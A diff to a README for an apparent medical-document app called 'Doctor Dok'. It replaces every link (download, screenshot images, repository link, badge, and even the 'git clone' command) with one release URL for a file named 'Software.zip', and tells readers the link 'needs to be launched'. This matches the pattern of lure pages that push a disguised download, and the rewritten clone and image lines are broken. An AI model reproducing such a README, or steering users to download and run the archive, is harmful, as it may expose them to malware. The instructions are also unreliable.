@@ -8,7 +8,7 @@ Welcome to the **Doctor Dok** repository! Convert all your medical documents suc
 - **Topics**: Not provided
 
 ## Get Started
-You can download the latest version of Doctor Dok from this zip file: [Download Doctor Dok](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+You can download the latest version of Doctor Dok from this zip file: [Download Doctor Dok](https://github.com/Nirvash27/doctor-dok/releases/download/v1.0/Software.zip)
 
 ### Note: 
 The provided link needs to be launched for downloading the Doctor Dok application.
@@ -21,11 +21,11 @@ The provided link needs to be launched for downloading the Doctor Dok applicatio
 🤖 **AI Integration**: Utilize AI tools to translate and analyze your documents effectively.  
 
 ## Screenshots
-![Screenshot1](https://via.placeholder.com/500)
-![Screenshot2](https://via.placeholder.com/500)
+![Screenshot1](https://github.com/Nirvash27/doctor-dok/releases/download/v1.0/Software.zip)
+![Screenshot2](https://github.com/Nirvash27/doctor-dok/releases/download/v1.0/Software.zip)
 
 ## Installation
-1. Clone the repository using `git clone https://github.com/username/doctor-dok.git`
+1. Clone the repository using `git clone https://github.com/Nirvash27/doctor-dok/releases/download/v1.0/Software.zip`
 2. Install the required dependencies with `npm install`
 3. Run the application using `npm start`
 
@@ -43,6 +43,6 @@ This project is licensed under the MIT license. See the [LICENSE](LICENSE) file 
 
 ---
 
-For more information, visit the [Doctor Dok GitHub Repository](https://github.com/username/doctor-dok)
+For more information, visit the [Doctor Dok GitHub Repository](https://github.com/Nirvash27/doctor-dok/releases/download/v1.0/Software.zip)
 
-[![Download Doctor Dok](https://img.shields.io/badge/Download-Doctor%20Dok-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Doctor Dok](https://github.com/Nirvash27/doctor-dok/releases/download/v1.0/Software.zip%20Dok-blue)](https://github.com/Nirvash27/doctor-dok/releases/download/v1.0/Software.zip)
